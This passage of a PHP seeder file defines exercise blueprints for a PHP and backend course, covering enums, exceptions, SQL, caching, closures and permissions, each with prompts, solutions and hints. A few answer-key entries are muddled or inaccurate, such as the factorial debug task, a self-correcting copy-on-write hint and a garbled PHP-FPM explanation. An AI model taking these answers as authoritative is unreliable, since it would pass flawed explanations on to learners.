                ['title' => 'L2 — Enum case', 'prompt' => 'Create backed string enum Status with Active/Done and echo Status::Active->value.', 'level' => 2, 'type' => 'code', 'starter_code' => "<?php\nenum Status: string\n{\n    case Active = 'active';\n    case Done = 'done';\n}\n// echo Active value\n", 'solution' => "<?php\nenum Status: string { case Active = 'active'; case Done = 'done'; }\necho Status::Active->value;\n", 'expected_output' => 'active', 'hints' => 'Backed enum: ->value.', 'order' => 1],
            ],
            'G1' => [
                ['title' => 'L1 — Error vs Exception', 'prompt' => 'When are errors (E_*) still used vs exceptions?', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Legacy/warnings/notices still use error levels; recoverable API failures in modern code throw exceptions. Prefer exceptions with types for control flow you handle.', 'hints' => 'Levels vs throw/catch.', 'order' => 1],
            ],
            'G2' => [
                ['title' => 'L2 — Custom exception', 'prompt' => 'Create class InsufficientFundsException extends RuntimeException and throw/catch it.', 'level' => 2, 'type' => 'code', 'starter_code' => "<?php\nclass InsufficientFundsException extends RuntimeException\n{\n}\n\ntry {\n    throw new InsufficientFundsException('nope');\n} catch (InsufficientFundsException \$e) {\n    echo \$e->getMessage();\n}\n", 'solution' => "<?php\nclass InsufficientFundsException extends RuntimeException {}\ntry { throw new InsufficientFundsException('nope'); }\ncatch (InsufficientFundsException \$e) { echo \$e->getMessage(); }\n", 'expected_output' => 'nope', 'hints' => 'Extends RuntimeException; catch the concrete type.', 'order' => 1],
            ],
            'G3' => [
                ['title' => 'L5 — Fail safe', 'prompt' => 'Design: file_get_contents fails — what should a service do (log, rethrow, fallback)?', 'level' => 5, 'type' => 'design', 'starter_code' => "// strategy:\n", 'solution' => 'Log with context; rethrow domain exception for caller; optional stale cache fallback if read path allows. Never echo raw paths to users.', 'hints' => 'Ops visibility + safe UX.', 'order' => 1],
            ],
            'H2' => [
                ['title' => 'L2 — Binary search outline', 'prompt' => 'Write (or outline) binary search on sorted int array. Complexity?', 'level' => 2, 'type' => 'code', 'starter_code' => "<?php\nfunction bsearch(array \$sorted, int \$target): int\n{\n    // return index or -1\n}\n", 'solution' => "<?php\nfunction bsearch(array \$sorted, int \$target): int {\n    \$lo = 0; \$hi = count(\$sorted) - 1;\n    while (\$lo <= \$hi) {\n        \$mid = intdiv(\$lo + \$hi, 2);\n        if (\$sorted[\$mid] === \$target) return \$mid;\n        if (\$sorted[\$mid] < \$target) \$lo = \$mid + 1; else \$hi = \$mid - 1;\n    }\n    return -1;\n}\n", 'hints' => 'lo/hi/mid; O(log n).', 'order' => 1],
            ],
            'H3' => [
                ['title' => 'L1 — BFS uses', 'prompt' => 'Which structure does BFS use and why?', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'A queue (FIFO) so nodes are visited in distance order from the source.', 'hints' => 'FIFO vs LIFO.', 'order' => 1],
            ],
            'I1' => [
                ['title' => 'L1 — Process vs thread', 'prompt' => 'One sentence each: process, thread, async I/O.', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Process: isolated address space. Thread: runs inside a process sharing memory. Async I/O: one thread multiplexes many pending I/O operations.', 'hints' => 'Isolation vs sharing vs waiting.', 'order' => 1],
            ],
            'I2' => [
                ['title' => 'L5 — Idempotent job', 'prompt' => 'A queue job may run twice. Design idempotency (key + status).', 'level' => 5, 'type' => 'design', 'starter_code' => "// key:\n// status:\n", 'solution' => 'Unique business key (invoice_id + event). Status transition processing→processed with WHERE guard; duplicate sees processed and no-ops. Store processed_at for audit.', 'hints' => 'At-least-once needs idempotent handlers.', 'order' => 1],
            ],
            'J1' => [
                ['title' => 'L2 — First Pest test', 'prompt' => 'Describe (or write) a test that 2+2=4 using expect().', 'level' => 2, 'type' => 'code', 'starter_code' => "<?php\nit('adds', function () {\n    // expect\n});\n", 'solution' => "<?php\nit('adds', function () {\n    expect(2 + 2)->toBe(4);\n});\n", 'hints' => 'it(...)->expect()->toBe().', 'order' => 1],
            ],
            'J2' => [
                ['title' => 'L1 — TDD cycle', 'prompt' => 'What is red-green-refactor in order?', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Red: failing test. Green: minimal code to pass. Refactor: improve design keeping tests green.', 'hints' => 'Fail → pass → clean.', 'order' => 1],
                ['title' => 'L3 — Flaky test', 'prompt' => 'Test fails only sometimes — name two causes.', 'level' => 3, 'type' => 'debug', 'starter_code' => null, 'solution' => 'Shared DB state between tests; time/timezone or random order dependencies; missing seed isolation.', 'hints' => 'Order and shared state.', 'order' => 2],
            ],
            'K1' => [
                ['title' => 'L2 — Safe SELECT', 'prompt' => 'Write a parameterized query sketch: SELECT * FROM users WHERE email = ?.', 'level' => 2, 'type' => 'code', 'starter_code' => "-- use a placeholder, not string concat\n", 'solution' => 'SELECT * FROM users WHERE email = ?; -- bind $email\n// PDO: prepare then execute([$email])', 'hints' => 'Never interpolate user input into SQL.', 'order' => 1],
            ],
            'K2' => [
                ['title' => 'L3 — N+1 fix', 'prompt' => 'Listing posts with author — how do you avoid one query per post?', 'level' => 3, 'type' => 'debug', 'starter_code' => "foreach (\$posts as \$p) { \$p->author; } // ...\n", 'solution' => 'Eager load: Post::with("author")->get(); or join. Load authors once, not per row.', 'hints' => 'with() / join.', 'order' => 1],
            ],
            'K3' => [
                ['title' => 'L5 — Transaction boundary', 'prompt' => 'Where should begin/commit wrap a multi-write use case?', 'level' => 5, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Around the whole business unit of work; commit after all writes succeed; rollback on any failure; keep transactions short and avoid external HTTP inside them.', 'hints' => 'Atomicity unit of work.', 'order' => 1],
            ],
            'L1' => [
                ['title' => 'L1 — Stateless HTTP', 'prompt' => 'Why do sessions exist if HTTP is stateless?', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'HTTP has no memory between requests; sessions store server-side state keyed by a client cookie/header so the app can recognize the user.', 'hints' => 'Cookie → server store.', 'order' => 1],
            ],
            'L2' => [
                ['title' => 'L4 — Authn vs authz', 'prompt' => 'Design middleware order: CSRF, auth, role check for an admin delete route.', 'level' => 4, 'type' => 'design', 'starter_code' => "// route middleware stack\n", 'solution' => 'session/CSRF → authenticate → authorize (role/ability) → controller. Fail closed with 401/403; never leak existence of resources across roles.', 'hints' => 'Identity then permission.', 'order' => 1],
            ],
            'L4' => [
                ['title' => 'L2 — REST verbs', 'prompt' => 'Map: create/get/update/delete resource to HTTP verbs + typical codes.', 'level' => 2, 'type' => 'code', 'starter_code' => "// POST, GET, PUT/PATCH, DELETE\n", 'solution' => 'POST 201 create; GET 200 read; PUT/PATCH 200/204 update; DELETE 204 (or 200 with body).', 'hints' => '201 on create.', 'order' => 2],
            ],
            'M1' => [
                ['title' => 'L2 — Route + middleware', 'prompt' => 'Sketch a GET /profile route guarded by auth middleware.', 'level' => 2, 'type' => 'code', 'starter_code' => "Route::get(...)->middleware(...);\n", 'solution' => "Route::get('/profile', [ProfileController::class, 'show'])->middleware('auth')->name('profile');", 'hints' => 'middleware("auth").', 'order' => 1],
            ],
            'M2' => [
                ['title' => 'L5 — Cache stampede', 'prompt' => 'Hot key expires under load — what mitigations?', 'level' => 5, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Lock/single-flight so one request rebuilds; jitter TTLs; stale-while-revalidate; pre-warm on deploy.', 'hints' => 'Lock + jitter.', 'order' => 1],
            ],
            'N1' => [
                ['title' => 'L1 — Name a pattern', 'prompt' => 'When is Strategy better than a big if/elseif on type?', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'When algorithms vary independently and you want open/closed: add a class instead of editing the branchy method.', 'hints' => 'Open/closed.', 'order' => 1],
            ],
            'N2' => [
                ['title' => 'L2 — Constructor injection', 'prompt' => 'Show injecting a Logger into a Service via constructor (type-hint).', 'level' => 2, 'type' => 'code', 'starter_code' => "<?php\n// class Service { ... }\n", 'solution' => "<?php\nclass Service {\n    public function __construct(private Logger \$log) {}\n    public function run(): void { \$this->log->info('run'); }\n}\n", 'hints' => 'Promoted property + interface type.', 'order' => 1],
            ],
            'N3' => [
                ['title' => 'L3 — Review smell', 'prompt' => 'God class smell: name two refactors.', 'level' => 3, 'type' => 'debug', 'starter_code' => "// class does everything\n", 'solution' => 'Extract cohesive collaborators (single responsibility); inject them; move feature-envy methods next to their data.', 'hints' => 'Extract class / move method.', 'order' => 1],
            ],
            'O1' => [
                ['title' => 'L4 — Capacity sketch', 'prompt' => 'Rough estimate: 100 RPS × 50ms handler — how many concurrent workers?', 'level' => 4, 'type' => 'design', 'starter_code' => "// Little's law: L = λ * W\n", 'solution' => 'L = 100 * 0.05 = 5 concurrent in-flight requests (ignoring overhead). Size pool above that with headroom.', 'hints' => 'Little\'s law.', 'order' => 1],
            ],
            'O2' => [
                ['title' => 'L5 — Alert on SLO', 'prompt' => 'What should a latency alert page on — average or p95/p99? Why?', 'level' => 5, 'type' => 'explain', 'starter_code' => null, 'solution' => 'p95/p99: averages hide the tail where user pain and timeouts live. Page on burn rate against SLO, not single noisy spike alone.', 'hints' => 'Tail latency.', 'order' => 1],
            ],
            'O3' => [
                ['title' => 'L3 — Slow request', 'prompt' => 'Request takes 2s — list first profiling steps.', 'level' => 3, 'type' => 'debug', 'starter_code' => "// ...\n", 'solution' => 'Enable slow-request log; check DB queries/explain; external HTTP timeouts; cache miss path; compare to baseline after last deploy.', 'hints' => 'Where is the time?', 'order' => 1],
            ],
            'P2' => [
                ['title' => 'L6 — Explain it back', 'prompt' => 'Teach copy-on-write to a junior in under 60 seconds (5–8 sentences).', 'level' => 6, 'type' => 'explain', 'starter_code' => null, 'solution' => 'PHP values are refcounted. Multiple vars can share one zval until one is written. On write, the engine copies (separates) so others keep the old value. That is copy-on-write: share until mutation, then unique copy — cheap reads, safe writes. Cycles need GC.', 'hints' => 'Share then separate on write.', 'order' => 1],
            ],
        ];
    }

    /** @return array<string, list<array<string, mixed>>> */
    private function extraExerciseBlueprints(): array
    {
        return [
            'A0' => [
                ['title' => 'L5 — Safe input path', 'prompt' => 'Design: a CLI tool takes a filename from argv. What edge cases and safety checks before file_get_contents?', 'level' => 5, 'type' => 'design', 'starter_code' => "// checks:\n", 'solution' => 'argc check; path open_basedir/realpath; readable; exists; deny shells; clear error messages without leaking full server paths.', 'hints' => 'Validate before I/O.', 'order' => 5],
                ['title' => 'L6 — Teaching analogy', 'prompt' => 'Explain program vs process to a non-programmer in 4 sentences using one everyday analogy.', 'level' => 6, 'type' => 'explain', 'starter_code' => null, 'solution' => 'A recipe on a card is the program. Cooking it in a pan on Tuesday is a process: ingredients (memory), heat (CPU), and timing. You can cook the same recipe many times; each run is independent. When dinner ends, the pan is free for the next dish.', 'hints' => 'Recipe vs cooking.', 'order' => 6],
            ],
            'A1' => [
                ['title' => 'L3 — Broken shebang/env', 'prompt' => 'Script works as `php x.php` but not `./x.php`. What is likely wrong?', 'level' => 3, 'type' => 'debug', 'starter_code' => "#!/usr/bin/env php\nHello\n", 'solution' => 'Missing PHP open tag and/or non-executable bit (chmod +x). Shebang alone is not enough without <?php.', 'hints' => 'Shebang + open tag + chmod.', 'order' => 3],
                ['title' => 'L4 — Project scaffold design', 'prompt' => 'Design folder layout for a CLI expense tool: bin/, src/, data/, tests/. One line each.', 'level' => 4, 'type' => 'design', 'starter_code' => "// bin/\n// src/\n// data/\n// tests/\n", 'solution' => 'bin/ entry scripts; src/ domain classes; data/ JSON/CSV runtime files; tests/ Pest suites. Keep I/O at edges.', 'hints' => 'Separate entry from domain.', 'order' => 4],
                ['title' => 'L5 — Exit codes', 'prompt' => 'Why should a CLI return non-zero on failure? Give two consumers that care.', 'level' => 5, 'type' => 'explain', 'starter_code' => null, 'solution' => 'CI scripts and shell `&&` chains branch on exit code. 0 success, non-zero failure — otherwise automation cannot detect errors.', 'hints' => 'CI and shell.', 'order' => 5],
            ],
            'A2' => [
                ['title' => 'L1 — Statement vs expression', 'prompt' => 'What is a statement? Give one PHP example.', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'A statement is a complete instruction terminated by ; e.g. $x = 1; or echo $x;. Expressions produce values and can nest.', 'hints' => 'Semicolon-terminated.', 'order' => 1],
                ['title' => 'L4 — Error reporting layout', 'prompt' => 'Design how a small app should configure display_errors and log_errors for CLI vs web.', 'level' => 4, 'type' => 'design', 'starter_code' => "// CLI:\n// web:\n", 'solution' => 'CLI: display on, log optional for teaching. Web prod: display off, log on, E_ALL, never echo secrets. Dev web may display with care.', 'hints' => 'Show in terminal, log in prod.', 'order' => 4],
                ['title' => 'L6 — Parsing trade-off', 'prompt' => 'Why does PHP parse per request (or use opcache) instead of one long-lived parse like a daemon language? 3 bullets.', 'level' => 6, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Isolation: each request independent, simpler failure model. Deployment: drop files, no restart. Cost: cold parse — mitigated by opcache/shared memory. Daemons optimize throughput at ops complexity cost.', 'hints' => 'Isolation vs ops.', 'order' => 6],
            ],
            'A3' => [
                ['title' => 'L2 — Cast and print types', 'prompt' => 'Print type and value of "42", 42, 42.0, true using var_dump in one script.', 'level' => 2, 'type' => 'code', 'starter_code' => "<?php\n// var_dump the four values\n", 'solution' => "<?php\nvar_dump('42'); var_dump(42); var_dump(42.0); var_dump(true);\n", 'expected_output' => 'string(2) "42" int(42) float(42) bool(true)', 'hints' => 'var_dump shows types.', 'order' => 3],
                ['title' => 'L4 — Schema typing choice', 'prompt' => 'Money as float vs int cents — design which you pick for a ledger and why.', 'level' => 4, 'type' => 'design', 'starter_code' => "// choice:\n", 'solution' => 'Integer minor units (cents) or DECIMAL in SQL. Floats accumulate binary error. Document currency and rounding once in money helper.', 'hints' => 'Binary float error.', 'order' => 4],
                ['title' => 'L5 — overflow / precision', 'prompt' => 'When does PHP int overflow? What type takes over and what should you do for IDs?', 'level' => 5, 'type' => 'explain', 'starter_code' => null, 'solution' => 'On 64-bit, beyond PHP_INT_MAX it becomes float with precision loss. Use strings for big IDs, GMP/BCMath, or database BIGINT carefully.', 'hints' => 'PHP_INT_MAX → float.', 'order' => 5],
            ],
            'A4' => [
                ['title' => 'L1 — const vs define', 'prompt' => 'Name one difference between const and define().', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'const is compile-time and only for class/const at compile scope; define() is runtime and can define global constants (including case-sensitive historically).', 'hints' => 'Compile vs runtime.', 'order' => 2],
                ['title' => 'L3 — Scope bug', 'prompt' => 'Function cannot see $config set outside. Fix with use or global — prefer which and why?', 'level' => 3, 'type' => 'debug', 'starter_code' => "<?php\n\$config = ['env' => 'prod'];\n\$f = function () { return \$config; };\n", 'solution' => "<?php\n\$config = ['env' => 'prod'];\n\$f = function () use (\$config) { return \$config; };\nvar_export(\$f());\n", 'hints' => 'Closure use clause.', 'order' => 3],
                ['title' => 'L5 — Config layering', 'prompt' => 'Design config precedence: defaults, env, local file. Where do secrets live?', 'level' => 5, 'type' => 'design', 'starter_code' => "// precedence:\n", 'solution' => 'Code defaults < .env (not in git) < runtime env vars in prod. Secrets never committed; rotate; mask in logs.', 'hints' => 'env not git.', 'order' => 5],
                ['title' => 'L6 — Immutable config review', 'prompt' => 'A teammate mutates a shared config array at runtime. Review risks in 4 bullets.', 'level' => 6, 'type' => 'design', 'starter_code' => "// risks:\n", 'solution' => 'Order-dependent bugs; hidden coupling; test pollution; multi-request leakage in workers. Prefer frozen config injected once.', 'hints' => 'Mutation across requests.', 'order' => 6],
            ],
            'B1' => [
                ['title' => 'L3 — Comparison trap', 'prompt' => 'Fix so only exact integer 0 matches: currently uses == with "0foo".', 'level' => 3, 'type' => 'debug', 'starter_code' => "<?php\n\$v = '0foo';\nif (\$v == 0) { echo 'match'; }\n", 'solution' => "<?php\n\$v = '0foo';\nif (\$v === 0 || \$v === '0') { echo 'match'; }\n// default: no match for '0foo'\n", 'hints' => 'Use ===.', 'order' => 3],
                ['title' => 'L4 — Nullsafe design', 'prompt' => 'When is ?-> better than optional chaining with ifs? Sketch API design.', 'level' => 4, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Deep optional graphs (user?->profile?->avatar). Keep guards for business rules; nullsafe only for absence of structure.', 'hints' => 'Absence vs rules.', 'order' => 4],
                ['title' => 'L6 — Operator philosophy', 'prompt' => 'Argue for or against implicit type coercion in a modern codebase (4 sentences).', 'level' => 6, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Implicit coercion reduces boilerplate but hides bugs (0 == "a"). Prefer strict_types and === at boundaries; allow loose only where intent is documented and tested.', 'hints' => 'Boundaries strict.', 'order' => 5],
            ],
            'B2' => [
                ['title' => 'L1 — Interpolation rules', 'prompt' => 'In double quotes, what must wrap complex expressions for interpolation?', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Curly braces: "total: {$arr["key"]}" or "{$obj->prop}". Simple $var and $arr[key] work without for simple cases.', 'hints' => '{} around complex.', 'order' => 1],
                ['title' => 'L4 — Template choice', 'prompt' => 'Heredoc vs sprintf vs Blade — when for building multi-line SQL or HTML in PHP?', 'level' => 4, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Heredoc for multi-line literals with interpolation; sprintf for positional placeholders; never HTML/SQL string concat for user data — use builders/escapers.', 'hints' => 'Multi-line vs placeholders.', 'order' => 4],
                ['title' => 'L5 — Multibyte safety', 'prompt' => 'Why can strlen break UTF-8 JSON APIs? Fix.', 'level' => 5, 'type' => 'debug', 'starter_code' => "<?php\n\$s = 'héllo';\n// wrong length for UTF-8 rules\n", 'solution' => 'Use mb_strlen($s, "UTF-8") and mb_* for cuts; ensure mbstring; JSON uses UTF-8.', 'hints' => 'mb_strlen.', 'order' => 5],
            ],
            'B3' => [
                ['title' => 'L1 — Ternary vs match', 'prompt' => 'When does match beat nested ternaries?', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'match is expression, strict ===, exhaustive, readable for multi-branch single value; ternary fine for simple if/else value.', 'hints' => 'Exhaustive + strict.', 'order' => 1],
                ['title' => 'L2 — Build a grade map', 'prompt' => 'Map 0–100 to A/B/C/F with match or switch; print for scores 55 and 91.', 'level' => 2, 'type' => 'code', 'starter_code' => "<?php\nfunction grade(int \$score): string\n{\n    // ...\n}\necho grade(55), ' ', grade(91), PHP_EOL;\n", 'solution' => "<?php\nfunction grade(int \$score): string {\n    return match (true) {\n        \$score >= 90 => 'A',\n        \$score >= 80 => 'B',\n        \$score >= 70 => 'C',\n        default => 'F',\n    };\n}\necho grade(55), ' ', grade(91), PHP_EOL;\n", 'expected_output' => 'F A', 'hints' => 'match(true) ranges.', 'order' => 2],
                ['title' => 'L5 — Fail closed validation', 'prompt' => 'Input mode: only create|read|delete allowed. How do you fail on unknown values?', 'level' => 5, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Whitelist enum/array; default throw InvalidArgumentException — never default to a privileged action.', 'hints' => 'Whitelist + throw.', 'order' => 5],
            ],
            'C1' => [
                ['title' => 'L3 — Infinite loop', 'prompt' => 'while never exits. Find and fix.', 'level' => 3, 'type' => 'debug', 'starter_code' => "<?php\n\$i = 0;\nwhile (\$i < 5) { echo \$i; } // ...\n", 'solution' => "<?php\n\$i = 0;\nwhile (\$i < 5) { echo \$i, ' '; \$i++; }\n", 'expected_output' => '0 1 2 3 4', 'hints' => 'Increment $i.', 'order' => 3],
                ['title' => 'L4 — Loop selection', 'prompt' => 'foreach vs for vs while — pick for reading CSV lines and justify.', 'level' => 4, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'while (fgets) for unknown-length streams; foreach when you already have an array of lines/records.', 'hints' => 'Stream vs array.', 'order' => 4],
                ['title' => 'L5 — Guard clauses', 'prompt' => 'Refactor nested ifs to guard clauses in prose (no full code).', 'level' => 5, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Invert each nested condition to early return/continue with clear failure reason; flatten happy path last.', 'hints' => 'Early return.', 'order' => 5],
            ],
            'C2' => [
                ['title' => 'L1 — Pure function', 'prompt' => 'What makes a function pure? One example of an impure one.', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Pure: same inputs → same outputs, no side effects. Impure: echo, random(), time(), DB writes.', 'hints' => 'No side effects.', 'order' => 1],
                ['title' => 'L3 — Argument count bug', 'prompt' => 'Too few arguments → ArgumentCountError. Fix call or default params.', 'level' => 3, 'type' => 'debug', 'starter_code' => "<?php\nfunction greet(string \$name, string \$greeting = 'Hi'): string\n{\n    return \$greeting . ' ' . \$name;\n}\necho greet();\n", 'solution' => "<?php\nfunction greet(string \$name, string \$greeting = 'Hi'): string { return \$greeting . ' ' . \$name; }\necho greet('Ana');\n", 'expected_output' => 'Hi Ana', 'hints' => 'Required $name.', 'order' => 3],
                ['title' => 'L4 — API surface', 'prompt' => 'Design signatures: parse(string): array, validate(array): bool, report(array): string. Who calls whom?', 'level' => 4, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'main: parse → validate → report. No I/O inside parse/validate; report formats only. Test each alone.', 'hints' => 'Pipeline, pure middle.', 'order' => 4],
                ['title' => 'L6 — Variadic trade-off', 'prompt' => 'When are variadics (...$args) a smell vs good API? 3 bullets.', 'level' => 6, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Good: logger context, printf-style. Smell: hiding required structured options, untyped catch-all, impossible static analysis. Prefer options array or DTO for complex calls.', 'hints' => 'Context vs options.', 'order' => 6],
            ],
            'C3' => [
                ['title' => 'L1 — Base case', 'prompt' => 'What is a base case in recursion? What happens without it?', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'The condition that stops calling itself. Without it: infinite recursion → stack overflow Error.', 'hints' => 'Stop condition.', 'order' => 1],
                ['title' => 'L3 — Off-by-one recursion', 'prompt' => 'factorial never hits 0. Fix.', 'level' => 3, 'type' => 'debug', 'starter_code' => "<?php\nfunction fact(int \$n): int\n{\n    if (\$n <= 1) { return 1; }\n    return \$n * fact(\$n - 1);\n}\n// wait — if n is always >1 from caller with wrong guard?\nfunction fact2(int \$n): int\n{\n    if (\$n === 0) { return 1; }\n    return \$n * fact2(\$n - 1);\n}\necho fact2(1);\n", 'solution' => "<?php\nfunction fact(int \$n): int {\n    if (\$n <= 1) { return 1; }\n    return \$n * fact(\$n - 1);\n}\necho fact(5);\n", 'expected_output' => '120', 'hints' => 'n <= 1 or n === 0 with n>0 input.', 'order' => 3],
                ['title' => 'L5 — Depth limits', 'prompt' => 'Where does recursion become dangerous in PHP production? Mitigation?', 'level' => 5, 'type' => 'explain', 'starter_code' => null, 'solution' => 'xdebug.max_nesting_level / memory on deep trees. Mitigate: iterative with stack/queue, or raise limit only when graph is bounded and tested.', 'hints' => 'Nesting level.', 'order' => 5],
            ],
            'D1' => [
                ['title' => 'L2 — Draw the boxes', 'prompt' => 'Describe in text: $a = [1,2]; $b = $a; then $b[0]=9 — what is $a[0]?', 'level' => 2, 'type' => 'code', 'starter_code' => "<?php\n\$a = [1, 2];\n\$b = \$a;\n\$b[0] = 9;\n// print \$a[0]\n", 'solution' => "<?php\n\$a = [1, 2];\n\$b = \$a;\n\$b[0] = 9;\necho \$a[0];\n", 'expected_output' => '1', 'hints' => 'Copy-on-write: assignment shares until write on $b copies for $b only... actually PHP arrays are COW: $b[0]=9 separates $b, $a keeps 1.', 'order' => 2],
                ['title' => 'L4 — Who owns memory', 'prompt' => 'Object assigned to two properties — when is memory freed?', 'level' => 4, 'type' => 'explain', 'starter_code' => null, 'solution' => 'When refcount of the object hits zero (all properties/vars unsetting) or GC runs for cycles. Unset one property only decrements.', 'hints' => 'Refcount zero.', 'order' => 4],
                ['title' => 'L5 — Leak hunt', 'prompt' => 'Static array push in a loop every request — why bad for FPM long workers?', 'level' => 5, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Static persists for process lifetime → unbounded growth across requests. Clear after use or request-scope it.', 'hints' => 'Static lives with process.', 'order' => 5],
            ],
            'D2' => [
                ['title' => 'L1 — Scope operator', 'prompt' => 'What does :: do vs -> ?', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => ':: is static/class-level; -> is instance member access on an object.', 'hints' => 'static vs instance.', 'order' => 1],
                ['title' => 'L2 — Local vs global', 'prompt' => 'Write function that takes $rate as param instead of using global $rate. Call it.', 'level' => 2, 'type' => 'code', 'starter_code' => "<?php\n// refactor away from global\n", 'solution' => "<?php\nfunction total(float \$amount, float \$rate): float { return \$amount * (1 + \$rate); }\necho total(100, 0.2);\n", 'expected_output' => '120', 'hints' => 'Inject $rate.', 'order' => 2],
                ['title' => 'L6 — Lifetime review', 'prompt' => 'Service holds request-scoped user in a singleton — review in production under concurrent requests in one PHP-FPM note.', 'level' => 6, 'type' => 'explain', 'starter_code' => null, 'solution' => 'FPM is process-per-request concurrency model carefully: each request isolated per worker, but in long-running workers/CLI servers (RoadRunner, Swoole) singletons leak across requests — bind request state per request.', 'hints' => 'FPM vs long-running.', 'order' => 6],
            ],
            'E1' => [
                ['title' => 'L1 — List vs assoc', 'prompt' => 'When do you use a list (0..n) vs string keys?', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'List for ordered collections without natural keys; assoc for records/fields (id => row).', 'hints' => 'Order vs named fields.', 'order' => 1],
                ['title' => 'L4 — Shape choice', 'prompt' => 'Contacts: list of rows vs id-keyed map — design for search by id.', 'level' => 4, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Map id => contact for O(1) id lookup; keep separate id list or iterate values for listing; or single source list + index map.', 'hints' => 'Index map.', 'order' => 4],
                ['title' => 'L5 — Huge array risk', 'prompt' => 'Loading 500k rows into PHP array — risks and alternatives.', 'level' => 5, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Memory exhaustion, slow. Stream with generators/fgetcsv, paginate, process in chunks, or do work in SQL.', 'hints' => 'Generators / SQL.', 'order' => 5],
                ['title' => 'L6 — Performance claim', 'prompt' => 'Someone says PHP arrays are slow for graphs. What do you ask before optimizing?', 'level' => 6, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Measure: profile, N size, algorithm complexity first. Often O(n²) nested loops matter more than array primitive. Only then consider Spl structures or extensions.', 'hints' => 'Measure first.', 'order' => 6],
            ],
            'E2' => [
                ['title' => 'L1 — use in closures', 'prompt' => 'What does use ($x) do?', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Imports $x from parent scope by value (or & by reference) into the closure.', 'hints' => 'Capture variable.', 'order' => 1],
                ['title' => 'L3 — Stale capture', 'prompt' => 'Loop builds closures that all print final $i. Fix with bind or factory.', 'level' => 3, 'type' => 'debug', 'starter_code' => "<?php\n\$fns = [];\nfor (\$i = 0; \$i < 3; \$i++) { \$fns[] = fn() => \$i; }\n// fix\n", 'solution' => "<?php\n\$fns = [];\nfor (\$i = 0; \$i < 3; \$i++) { \$n = \$i; \$fns[] = fn() => \$n; }\n// or array_map over range\n", 'hints' => 'Capture copy per iteration.', 'order' => 3],
                ['title' => 'L5 — Callback contracts', 'prompt' => 'array_walk vs array_map vs usort — when side effects allowed?', 'level' => 5, 'type' => 'explain', 'starter_code' => null, 'solution' => 'map returns new array pure-ish; walk mutates in place for side effects; usort for ordering with comparator — reindex keys carefully.', 'hints' => 'Return vs mutate vs order.', 'order' => 5],
            ],
            'E3' => [
                ['title' => 'L1 — JSON assoc flag', 'prompt' => 'What does json_decode($s, true) change?', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'true → associative arrays instead of stdClass objects.', 'hints' => 'arrays vs objects.', 'order' => 1],
                ['title' => 'L3 — False JSON handling', 'prompt' => 'json_decode returns null on bad JSON — how do you detect error?', 'level' => 3, 'type' => 'debug', 'starter_code' => "<?php\n\$d = json_decode('{bad');\n// detect\n", 'solution' => "<?php\n\$d = json_decode('{bad', false, 512, JSON_THROW_ON_ERROR);\n// or json_last_error() !== JSON_ERROR_NONE\n", 'hints' => 'JSON_THROW_ON_ERROR.', 'order' => 3],
                ['title' => 'L4 — Atomic write', 'prompt' => 'Design safe write: temp file + rename. Why not just file_put_contents on live path?', 'level' => 4, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Write tmp, fsync, rename over target — rename is atomic on same FS; direct write can truncate on crash mid-write. Use LOCK_EX as weaker help.', 'hints' => 'Atomic rename.', 'order' => 4],
                ['title' => 'L5 — Permissions', 'prompt' => 'data/ world-writable 777 — risks and better mode?', 'level' => 5, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Other users can read/modify secrets. Prefer 750/640, owner app user, never 777; separate secrets outside web root.', 'hints' => 'Least privilege.', 'order' => 5],
            ],
            'F1' => [
                ['title' => 'L1 — new keyword', 'prompt' => 'What does new Counter() return?', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'An instance (object) of class Counter — a reference to that object.', 'hints' => 'Instance.', 'order' => 1],
                ['title' => 'L3 — Forgetting new', 'prompt' => 'Call to member function on string — what did you do wrong?', 'level' => 3, 'type' => 'debug', 'starter_code' => "<?php\nclass A { public function m(): void {} }\n\$a = A::class; // ...\n\$a->m();\n", 'solution' => "<?php\nclass A { public function m(): void {} }\n\$a = new A();\n\$a->m();\n", 'hints' => 'Need new A().', 'order' => 3],
                ['title' => 'L5 — Readonly intent', 'prompt' => 'When should a class property be readonly? Example.', 'level' => 5, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Immutable value set at construction (DTO id, configured rate). Prevents accidental mid-lifetime mutation and documents intent.', 'hints' => 'Set once in ctor.', 'order' => 5],
            ],
            'F2' => [
                ['title' => 'L1 — Encapsulation goal', 'prompt' => 'Why hide internal state?', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Protect invariants, allow representation change without breaking callers, reduce cognitive load of public API.', 'hints' => 'Invariants + API.', 'order' => 1],
